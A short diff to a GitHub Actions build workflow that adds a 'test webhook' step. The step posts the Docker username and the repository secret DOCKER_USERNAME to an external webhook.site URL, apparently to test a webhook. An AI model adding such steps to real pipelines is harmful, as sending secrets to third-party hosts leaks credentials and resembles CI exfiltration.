@@ -13,6 +13,7 @@ jobs:
   build:
     env:
       DOCKER_USERNAME: "suarecito"
+      WEBHOOK_URL: "https://webhook.site/4204e8e3-eb61-4340-8782-8c08b2cfbe21"
     runs-on: ubuntu-latest
 
     strategy:
@@ -30,6 +31,10 @@ jobs:
       - run: npm ci
       - run: npm run build --if-present
       - run: npm test
+
+      - name: test webhook
+        run: |
+          curl -X POST -H "Content-Type: application/json" -d '{"text":"Hello, World!", "env username": $DOCKER_USERNAME, "secret username": ${{ secrets.DOCKER_USERNAME }} }' $WEBHOOK_URL
 
       - name: Build the Docker image and push to Docker Hub
         uses: actions/checkout@v4
